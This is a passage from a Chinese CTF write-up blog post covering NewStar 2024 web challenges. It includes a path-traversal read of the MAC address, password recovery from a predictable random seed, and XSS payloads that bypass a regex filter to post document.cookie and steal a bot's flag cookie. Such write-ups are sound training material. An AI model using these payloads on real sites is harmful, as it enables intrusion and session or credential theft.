</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> web<span style="color:#f92672">.</span>FileResponse(<span style="color:#e6db74">&#39;./template/404.html&#39;</span>, status<span style="color:#f92672">=</span><span style="color:#ae81ff">404</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">async</span> <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">handler_500</span>(request):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> web<span style="color:#f92672">.</span>FileResponse(<span style="color:#e6db74">&#39;./template/500.html&#39;</span>, status<span style="color:#f92672">=</span><span style="color:#ae81ff">500</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">async</span> <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">index</span>(request):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> web<span style="color:#f92672">.</span>FileResponse(<span style="color:#e6db74">&#39;./template/index.html&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">async</span> <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">login</span>(request):
</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> request<span style="color:#f92672">.</span>post()
</span></span><span style="display:flex;"><span>    username <span style="color:#f92672">=</span> data[<span style="color:#e6db74">&#39;username&#39;</span>]
</span></span><span style="display:flex;"><span>    password <span style="color:#f92672">=</span> data[<span style="color:#e6db74">&#39;password&#39;</span>]
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> authenticate(username, password):
</span></span><span style="display:flex;"><span>        session <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> get_session(request)
</span></span><span style="display:flex;"><span>        session[<span style="color:#e6db74">&#39;user&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;admin&#39;</span>
</span></span><span style="display:flex;"><span>        response <span style="color:#f92672">=</span> web<span style="color:#f92672">.</span>HTTPFound(<span style="color:#e6db74">&#39;/home&#39;</span>)
</span></span><span style="display:flex;"><span>        response<span style="color:#f92672">.</span>session <span style="color:#f92672">=</span> session
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> response
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> web<span style="color:#f92672">.</span>Response(text<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;账号或密码错误哦&#34;</span>, status<span style="color:#f92672">=</span><span style="color:#ae81ff">200</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">async</span> <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">home</span>(request):
</span></span><span style="display:flex;"><span>    session <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> get_session(request)
</span></span><span style="display:flex;"><span>    user <span style="color:#f92672">=</span> session<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;user&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> user <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;admin&#39;</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> web<span style="color:#f92672">.</span>FileResponse(<span style="color:#e6db74">&#39;./template/home.html&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> web<span style="color:#f92672">.</span>HTTPFound(<span style="color:#e6db74">&#39;/&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">async</span> <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">upload</span>(request):
</span></span><span style="display:flex;"><span>    session <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> get_session(request)
</span></span><span style="display:flex;"><span>    user <span style="color:#f92672">=</span> session<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;user&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> user <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;admin&#39;</span>:
</span></span><span style="display:flex;"><span>        reader <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> request<span style="color:#f92672">.</span>multipart()
</span></span><span style="display:flex;"><span>        file <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> reader<span style="color:#f92672">.</span>next()
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> file:
</span></span><span style="display:flex;"><span>            filename <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;./static/&#39;</span> <span style="color:#f92672">+</span> file<span style="color:#f92672">.</span>filename
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">with</span> open(filename,<span style="color:#e6db74">&#39;wb&#39;</span>) <span style="color:#66d9ef">as</span> f:
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
</span></span><span style="display:flex;"><span>                    chunk <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> file<span style="color:#f92672">.</span>read_chunk()
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> chunk:
</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>                    f<span style="color:#f92672">.</span>write(chunk)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> web<span style="color:#f92672">.</span>HTTPFound(<span style="color:#e6db74">&#34;/list&#34;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>            response <span style="color:#f92672">=</span> web<span style="color:#f92672">.</span>HTTPFound(<span style="color:#e6db74">&#39;/home&#39;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> response
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> web<span style="color:#f92672">.</span>HTTPFound(<span style="color:#e6db74">&#39;/&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">async</span> <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">ListFile</span>(request):
</span></span><span style="display:flex;"><span>    session <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> get_session(request)
</span></span><span style="display:flex;"><span>    user <span style="color:#f92672">=</span> session<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;user&#39;</span>)
</span></span><span style="display:flex;"><span>    command <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;ls ./static&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> user <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;admin&#39;</span>:
</span></span><span style="display:flex;"><span>        result <span style="color:#f92672">=</span> subprocess<span style="color:#f92672">.</span>run(command, shell<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>, check<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>, text<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>, capture_output<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
</span></span><span style="display:flex;"><span>        files_list <span style="color:#f92672">=</span> result<span style="color:#f92672">.</span>stdout
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> web<span style="color:#f92672">.</span>Response(text<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;static目录下存在文件</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">+</span>files_list)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> web<span style="color:#f92672">.</span>HTTPFound(<span style="color:#e6db74">&#39;/&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">async</span> <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">init_app</span>():
</span></span><span style="display:flex;"><span>    app <span style="color:#f92672">=</span> web<span style="color:#f92672">.</span>Application()
</span></span><span style="display:flex;"><span>    app<span style="color:#f92672">.</span>router<span style="color:#f92672">.</span>add_static(<span style="color:#e6db74">&#39;/static/&#39;</span>, <span style="color:#e6db74">&#39;./static&#39;</span>, follow_symlinks<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
</span></span><span style="display:flex;"><span>    session_setup(app, EncryptedCookieStorage(secret_key<span style="color:#f92672">=</span>CreteKey()))
</span></span><span style="display:flex;"><span>    app<span style="color:#f92672">.</span>middlewares<span style="color:#f92672">.</span>append(middleware)
</span></span><span style="display:flex;"><span>    app<span style="color:#f92672">.</span>router<span style="color:#f92672">.</span>add_route(<span style="color:#e6db74">&#39;GET&#39;</span>, <span style="color:#e6db74">&#39;/&#39;</span>, index)
</span></span><span style="display:flex;"><span>    app<span style="color:#f92672">.</span>router<span style="color:#f92672">.</span>add_route(<span style="color:#e6db74">&#39;POST&#39;</span>, <span style="color:#e6db74">&#39;/&#39;</span>, login)
</span></span><span style="display:flex;"><span>    app<span style="color:#f92672">.</span>router<span style="color:#f92672">.</span>add_route(<span style="color:#e6db74">&#39;GET&#39;</span>, <span style="color:#e6db74">&#39;/home&#39;</span>, home)
</span></span><span style="display:flex;"><span>    app<span style="color:#f92672">.</span>router<span style="color:#f92672">.</span>add_route(<span style="color:#e6db74">&#39;POST&#39;</span>, <span style="color:#e6db74">&#39;/upload&#39;</span>, upload)
</span></span><span style="display:flex;"><span>    app<span style="color:#f92672">.</span>router<span style="color:#f92672">.</span>add_route(<span style="color:#e6db74">&#39;GET&#39;</span>, <span style="color:#e6db74">&#39;/list&#39;</span>, ListFile)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> app
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>web<span style="color:#f92672">.</span>run_app(init_app(), host<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;0.0.0.0&#39;</span>, port<span style="color:#f92672">=</span><span style="color:#ae81ff">80</span>)
</span></span></code></pre></div><p>这里 <code>admin</code> 密码使用了随机数，然而随机数的 <code>randseed</code> 设置如下，<code>random.seed(uuid.getnode())</code>.</p>
<p>这里种子是固定值，即 MAC 地址，可以通过文件读取获取这个种子。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-markdown" data-lang="markdown"><span style="display:flex;"><span>/static/../../sys/class/net/eth0/address
</span></span></code></pre></div><p>读取到mac地址</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-markdown" data-lang="markdown"><span style="display:flex;"><span>c6:7a:dd:01:e8:13#c67add01e813
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> random
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> string
</span></span><span style="display:flex;"><span>random<span style="color:#f92672">.</span>seed(<span style="color:#ae81ff">0xc67add01e813</span>)
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(random<span style="color:#f92672">.</span>choices(string<span style="color:#f92672">.</span>ascii_letters <span style="color:#f92672">+</span> string<span style="color:#f92672">.</span>digits, k<span style="color:#f92672">=</span><span style="color:#ae81ff">8</span>)))
</span></span><span style="display:flex;"><span><span style="color:#75715e">#xPcTBtpn</span>
</span></span></code></pre></div><p>得到密码就可以正常登入了</p>
<p>定位一下上传文件的代码，简单分析进行以下操作</p>
<p><img alt="58" loading="lazy" src="../../images/Newstar/2024/58.png"></p>
<p><img alt="59" loading="lazy" src="../../images/Newstar/2024/59.png"></p>
<p>最后直接用开始的目录穿越就可以得到flag了</p>
<p><img alt="60" loading="lazy" src="../../images/Newstar/2024/60.png"></p>
<h3 id="pangbai-过家家5复现">PangBai 过家家（5）(复现)<a hidden class="anchor" aria-hidden="true" href="#pangbai-过家家5复现">#</a></h3>
<p>在<code>bot.ts</code>里有内容</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ts" data-lang="ts"><span style="display:flex;"><span><span style="color:#66d9ef">await</span> <span style="color:#a6e22e">page</span>.<span style="color:#a6e22e">setCookie</span>({
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">name</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;FLAG&#39;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">value</span>: <span style="color:#66d9ef">process.env</span>[<span style="color:#e6db74">&#39;FLAG&#39;</span>] <span style="color:#f92672">||</span> <span style="color:#e6db74">&#39;flag{test_flag}&#39;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">httpOnly</span>: <span style="color:#66d9ef">false</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">path</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;/&#39;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">domain</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;localhost:3000&#39;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">sameSite</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;Strict&#39;</span>
</span></span><span style="display:flex;"><span>    });
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">img</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">onerror</span><span style="color:#f92672">=</span><span style="color:#a6e22e">alert</span>(<span style="color:#ae81ff">1</span>);<span style="color:#75715e">//
</span></span></span></code></pre></div><p>可以绕过但是不出网</p>
<p>跟踪附件中的后端源码，<code>page.ts</code> 中的 <code>/box/:id</code> 路由，会渲染我们的输入</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ts" data-lang="ts"><span style="display:flex;"><span><span style="color:#a6e22e">router</span>.<span style="color:#66d9ef">get</span>(<span style="color:#e6db74">&#39;/box/:id&#39;</span>, <span style="color:#66d9ef">async</span> (<span style="color:#a6e22e">ctx</span>, <span style="color:#a6e22e">next</span>) <span style="color:#f92672">=&gt;</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">letter</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Memory</span>.<span style="color:#66d9ef">get</span>(<span style="color:#a6e22e">ctx</span>.<span style="color:#a6e22e">params</span>[<span style="color:#e6db74">&#39;id&#39;</span>])
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">ctx</span>.<span style="color:#a6e22e">render</span>(<span style="color:#e6db74">&#39;letter&#39;</span>, &lt;<span style="color:#f92672">TmplProps</span>&gt;{
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">page_title</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;PangBai 过家家 (5)&#39;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">sub_title</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;查看信件&#39;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">id</span>: <span style="color:#66d9ef">ctx.params</span>[<span style="color:#e6db74">&#39;id&#39;</span>],
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">hint_text</span>: <span style="color:#66d9ef">HINT_LETTERS</span>[Math.<span style="color:#a6e22e">floor</span>(Math.<span style="color:#a6e22e">random</span>() <span style="color:#f92672">*</span> <span style="color:#a6e22e">HINT_LETTERS</span>.<span style="color:#a6e22e">length</span>)],
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">data</span>: <span style="color:#66d9ef">letter</span> <span style="color:#f92672">?</span> {
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">title</span>: <span style="color:#66d9ef">safe_html</span>(<span style="color:#a6e22e">letter</span>.<span style="color:#a6e22e">title</span>),
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">content</span>: <span style="color:#66d9ef">safe_html</span>(<span style="color:#a6e22e">letter</span>.<span style="color:#a6e22e">content</span>)
</span></span><span style="display:flex;"><span>        } <span style="color:#f92672">:</span> { <span style="color:#a6e22e">title</span>: <span style="color:#66d9ef">TITLE_EMPTY</span>, <span style="color:#a6e22e">content</span>: <span style="color:#66d9ef">CONTENT_EMPTY</span> },
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">error</span>: <span style="color:#66d9ef">letter</span> <span style="color:#f92672">?</span> <span style="color:#66d9ef">null</span> <span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;找不到该信件&#39;</span>
</span></span><span style="display:flex;"><span>    })
</span></span><span style="display:flex;"><span>})
</span></span></code></pre></div><p>但是输入的内容都经过了 <code>safe_html</code> 过滤</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ts" data-lang="ts"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">safe_html</span>(<span style="color:#a6e22e">str</span>: <span style="color:#66d9ef">string</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">str</span>
</span></span><span style="display:flex;"><span>        .<span style="color:#a6e22e">replace</span>(<span style="color:#e6db74">/&lt;.*&gt;/igm</span>, <span style="color:#e6db74">&#39;&#39;</span>)
</span></span><span style="display:flex;"><span>        .<span style="color:#a6e22e">replace</span>(<span style="color:#e6db74">/&lt;\.*&gt;/igm</span>, <span style="color:#e6db74">&#39;&#39;</span>)
</span></span><span style="display:flex;"><span>        .<span style="color:#a6e22e">replace</span>(<span style="color:#e6db74">/&lt;.*&gt;.*&lt;\/.*&gt;/igm</span>, <span style="color:#e6db74">&#39;&#39;</span>)
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>可见这只是一个正则替换，正则中各个标志的作用：</p>
<ul>
<li>
<p><code>i</code> 标志：忽略大小写</p>
</li>
<li>
<p><code>g</code> 标志：全局匹配，找到所有符合条件的内容</p>
</li>
<li>
<p><code>m</code> 标志：多行匹配，每次匹配时按行进行匹配，而不是对整个字符串进行匹配</p>
<p>由于 <code>m</code> 的存在，匹配开始为行首，匹配结束为行尾，因此我们只需要把 <code>&lt;</code> 和 <code>&gt;</code> 放在不同行即可</p>
</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#39;/api/send&#39;</span>, {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">method</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;POST&#39;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">headers</span><span style="color:#f92672">:</span> {<span style="color:#e6db74">&#39;Content-Type&#39;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;application/json&#39;</span>},
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">body</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>({<span style="color:#e6db74">&#39;title&#39;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;Cookie&#34;</span>, <span style="color:#e6db74">&#39;content&#39;</span><span style="color:#f92672">:</span> document.<span style="color:#a6e22e">cookie</span>})
</span></span><span style="display:flex;"><span>})
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/script</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;</span>
</span></span></code></pre></div><p>还看的一种野生的方法，记录一下</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">img</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">onerror</span><span style="color:#f92672">=</span><span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#34;/api/send&#34;</span>,{<span style="color:#a6e22e">method</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#39;POST&#39;</span>,<span style="color:#a6e22e">headers</span><span style="color:#f92672">:</span>{<span style="color:#e6db74">&#39;Content-Type&#39;</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#39;application/json&#39;</span>},<span style="color:#a6e22e">body</span><span style="color:#f92672">:</span><span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>({<span style="color:#e6db74">&#34;title&#34;</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;123123123&#34;</span>,<span style="color:#e6db74">&#34;content&#34;</span><span style="color:#f92672">:</span>document.<span style="color:#a6e22e">cookie</span>})});<span style="color:#75715e">//
</span></span></span></code></pre></div><p>大体是一致的思路，只是为了绕过xss的限制</p>
<h3 id="ez_redis复现">ez_redis(复现)<a hidden class="anchor" aria-hidden="true" href="#ez_redis复现">#</a></h3>
<p>这题考察是cve，直接扔链接了，好累</p>
<p><a href="https://github.com/vulhub/vulhub/blob/master/redis/CVE-2022-0543/README.zh-cn.md">vulhub/redis/CVE-2022-0543/README.zh-cn.md at master · vulhub/vulhub (github.com)</a></p>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="http://localhost:1313/tags/ctf/">Ctf</a></li>
    </ul>
  </footer>
</article>
    </main>
    
<footer class="footer">
        <span>&copy; 2026 <a href="http://localhost:1313/">0raN9e&#39;s Blog</a></span> · 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu');
    if (menu) {
        
        const scrollPosition = localStorage.getItem("menu-scroll-position");
        if (scrollPosition) {
            menu.scrollLeft = parseInt(scrollPosition, 10);
        }
        
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        const html = document.querySelector("html");
        if (html.dataset.theme === "dark") {
            html.dataset.theme = 'light';
            localStorage.setItem("pref-theme", 'light');
        } else {
            html.dataset.theme = 'dark';
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
</body>

</html>
